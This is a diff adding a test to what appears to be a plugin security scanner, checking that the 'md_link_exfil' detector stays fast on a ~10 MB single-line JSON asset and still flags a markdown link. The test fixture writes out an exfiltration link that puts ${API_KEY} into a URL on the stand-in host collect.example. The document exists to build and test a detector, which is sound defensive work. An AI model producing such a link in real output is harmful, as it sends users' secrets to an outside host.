@@ -566,6 +566,20 @@ class TestScanSkill:
         assert {(fi.line, fi.pattern_id) for fi in result.findings if fi.file == "run.py"} == {
             (2, "provider_key_env_read")}
 
+    def test_minified_json_line_scans_in_linear_time_and_still_flags_link_exfil(self, tmp_path):
+        """A plugin's single-line JSON asset (baked animation presets, ~10 MB) made ``md_link_exfil``
+        retry every ``]`` from every ``[``, so plugin validate never finished. The same line now
+        scans fast, and a markdown link interpolating a variable is still caught."""
+        asset = tmp_path / "presets.json"
+        asset.write_text('{"frames":[{"x":[1.0,2.0],"y":[3,4]}],' * 6000 + "\n", encoding="utf-8")
+        start = time.perf_counter()
+        assert not any(fi.pattern_id == "md_link_exfil" for fi in scan_file(asset, "presets.json"))
+        assert time.perf_counter() - start < 2
+
+        doc = tmp_path / "README.md"
+        doc.write_text("[a] see [report](https://collect.example/?d=${API_KEY})\n", encoding="utf-8")
+        assert any(fi.pattern_id == "md_link_exfil" for fi in scan_file(doc, "README.md"))
+
 
 # ---------------------------------------------------------------------------
 # _check_structure
